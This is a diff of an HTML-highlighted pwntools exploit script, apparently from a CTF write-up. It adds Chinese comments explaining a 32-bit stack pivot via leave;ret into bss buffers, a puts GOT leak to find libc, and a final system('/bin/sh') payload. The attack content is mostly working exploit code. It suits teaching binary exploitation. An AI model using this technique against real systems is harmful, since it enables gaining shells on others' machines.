@@ -443,11 +443,14 @@ buf1 <span class="token operator">=</span> elf<span class="token punctuation">.<
 buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>
 
 payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span>
+<span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>
 payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>
 p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
 
+<span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>
 payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
@@ -457,7 +460,6 @@ puts_addr <span class="token operator">=</span>u32<span class="token punctuation
 offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libc
 system_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offset
 binsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset
-
 <span class="token triple-quoted-string string">'''
 payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)
 p.send(payload)
@@ -466,6 +468,7 @@ sleep(0.1)
 p.interactive()
 '''</span>
 
+<span class="token comment" spellcheck="true">#懵逼栈</span>
 payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
